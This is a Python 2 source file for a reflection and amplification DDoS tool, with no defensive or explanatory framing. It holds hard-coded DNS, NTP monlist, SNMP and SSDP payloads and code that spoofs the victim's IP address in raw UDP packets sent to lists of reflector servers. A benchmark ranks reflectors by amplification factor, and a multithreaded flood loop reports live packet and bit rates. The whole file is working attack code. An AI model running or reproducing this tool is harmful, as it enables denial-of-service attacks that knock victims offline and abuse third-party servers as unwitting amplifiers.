#!/usr/bin/env python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import sys
import time
import socket
import struct
import threading
from random import randint
from pinject import IP, UDP
############################# AMPLIFICATON CONSTANTS ###########################
BENCHMARK = (
    'Protocol'
    '|  IP  Address  '
    '|     Amplification     '
    '|     Domain    '
    '\n{}').format('-' * 75)

ATTACK = (
    '     Sent      '
    '|    Traffic    '
    '|    Packet/s   '
    '|     Bit/s     '
    '\n{}').format('-' * 63)

PORT = {
    'dns': 53,
    'ntp': 123,
    'snmp': 161,
    'ssdp': 1900}

PAYLOAD = {
    'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
            '{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
            '\x00\x00\x00\x00\x00\x00'),
    'snmp': ('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
             '\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
             '\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
             '\x01\x02\x01\x05\x00'),
    'ntp': ('\x17\x00\x02\x2a' + '\x00' * 4),
    'ssdp': ('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
             'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
}

amplification = {
    'dns': {},
    'ntp': {},
    'snmp': {},
    'ssdp': {}}  # Amplification factor

FILE_NAME = 0  # Index of files names
FILE_HANDLE = 1  # Index of files descriptors

npackets = 0  # Number of packets sent
nbytes = 0  # Number of bytes reflected
files = {}  # Amplifications files

SUFFIX = {
    0: '',
    1: 'K',
    2: 'M',
    3: 'G',
    4: 'T'}

###################### AMPLIFICATION SOURCE CODE ##############################

def Calc(n, d, unit=''):
    i = 0
    r = float(n)
    while r / d >= 1:
        r = r / d
        i += 1
    return '{:.2f}{}{}'.format(r, SUFFIX[i], unit)


def GetDomainList(domains):
    domain_list = []

    if '.TXT' in domains.upper():
        file = open(domains, 'r')
        content = file.read()
        file.close()
        content = content.replace('\r', '')
        content = content.replace(' ', '')
        content = content.split('\n')
        for domain in content:
            if domain:
                domain_list.append(domain)
    else:
        domain_list = domains.split(',')
    return domain_list


def Monitor():
    '''
        Monitor attack
    '''
    print ATTACK
    FMT = '{:^15}|{:^15}|{:^15}|{:^15}'
    start = time.time()
    while True:
        try:
            current = time.time() - start
            bps = (nbytes * 8) / current
            pps = npackets / current
            out = FMT.format(Calc(npackets, 1000),
                             Calc(nbytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
            sys.stderr.write('\r{}{}'.format(out, ' ' * (60 - len(out))))
            time.sleep(1)
        except KeyboardInterrupt:
            print '\nInterrupted'
            break
        except Exception as err:
            print '\nError:', str(err)
            break


def AmpFactor(recvd, sent):
    return '{}x ({}B -> {}B)'.format(recvd / sent, sent, recvd)


def Benchmark(ddos):
    print BENCHMARK
    i = 0
    for proto in files:
        f = open(files[proto][FILE_NAME], 'r')
        while True:
            soldier = f.readline().strip()
            if soldier:
                if proto == 'dns':
                    for domain in ddos.domains:
                        i += 1
                        recvd, sent = ddos.GetAmpSize(proto, soldier, domain)
                        if recvd / sent:
                            print '{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier,
                                                                  AmpFactor(recvd, sent), domain)
                        else:
                            continue
                else:
                    recvd, sent = ddos.GetAmpSize(proto, soldier)
                    print '{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier,
                                                          AmpFactor(recvd, sent), 'N/A')
                    i += 1
            else:
                break
        print 'Total tested:', i
        f.close()


class DDoS(object):
    def __init__(self, target, threads, domains, event):
        self.target = target
        self.threads = threads
        self.event = event
        self.domains = domains

    def stress(self):
        for i in range(self.threads):
            t = threading.Thread(target=self.__attack)
            t.start()

    def __send(self, sock, soldier, proto, payload):
        '''
            Send a Spoofed Packet
        '''
        udp = UDP(randint(1, 65535), PORT[proto], payload).pack(self.target, soldier)
        ip = IP(self.target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
        sock.sendto(ip + udp + payload, (soldier, PORT[proto]))

    def GetAmpSize(self, proto, soldier, domain=''):
        '''
            Get Amplification Size
        '''
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        data = ''
        if proto in ['ntp', 'ssdp']:
            packet = PAYLOAD[proto]
            sock.sendto(packet, (soldier, PORT[proto]))
            try:
                while True:
                    data += sock.recvfrom(65535)[0]
            except socket.timeout:
                sock.close()
                return len(data), len(packet)
        if proto == 'dns':
            packet = self.__GetDnsQuery(domain)
        else:
            packet = PAYLOAD[proto]
        try:
            sock.sendto(packet, (soldier, PORT[proto]))
            data, _ = sock.recvfrom(65535)
        except socket.timeout:
            data = ''
        finally:
            sock.close()
        return len(data), len(packet)

    def __GetQName(self, domain):
        '''
            QNAME A domain name represented as a sequence of labels
            where each label consists of a length
            octet followed by that number of octets
        '''
        labels = domain.split('.')
        QName = ''
        for label in labels:
            if len(label):
                QName += struct.pack('B', len(label)) + label
        return QName

    def __GetDnsQuery(self, domain):
        id = struct.pack('H', randint(0, 65535))
        QName = self.__GetQName(domain)
        return PAYLOAD['dns'].format(id, QName)

    def __attack(self):
        global npackets
        global nbytes
        _files = files
        # print _files
        for proto in _files:  # Open Amplification files
            # print 'Proto ' + str(proto) + ' ' + str(FILE_NAME)
            # print _files[proto]
            f = open(_files[proto][FILE_NAME], 'r')  # [FILE_NAME]
            _files[proto].append(f)  # _files = {'proto':['file_name', file_handle]}
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        i = 0
        while self.event.isSet():
            for proto in _files:
                soldier = _files[proto][FILE_HANDLE].readline().strip()
                if soldier:
                    if proto == 'dns':
                        if not amplification[proto].has_key(soldier):
                            amplification[proto][soldier] = {}
                        for domain in self.domains:
                            if not amplification[proto][soldier].has_key(domain):
                                size, _ = self.GetAmpSize(proto, soldier, domain)
                                if size == 0:
                                    break
                                elif size < len(PAYLOAD[proto]):
                                    continue
                                else:
                                    amplification[proto][soldier][domain] = size
                            amp = self.__GetDnsQuery(domain)
                            #print 'Sock: ' + str(sock.getsockname)
                            #print 'Sock: ' + str(sock.getpeername)
                            #print 'Soldier: ' + str(soldier)
                            #print 'Proto: ' + str(proto)
                            #print 'AMP: ' + str(amp)
                            self.__send(sock, soldier, proto, amp)
                            npackets += 1
                            i += 1
                            nbytes += amplification[proto][soldier][domain]
                    else:
                        if not amplification[proto].has_key(soldier):
                            size, _ = self.GetAmpSize(proto, soldier)
                            if size < len(PAYLOAD[proto]):
                                continue
                            else:
                                amplification[proto][soldier] = size
                        amp = PAYLOAD[proto]
                        npackets += 1
                        i += 1
                        nbytes += amplification[proto][soldier]
                        self.__send(sock, soldier, proto, amp)
                else:
                    _files[proto][FILE_HANDLE].seek(0)
        sock.close()
        for proto in _files:
            _files[proto][FILE_HANDLE].close()

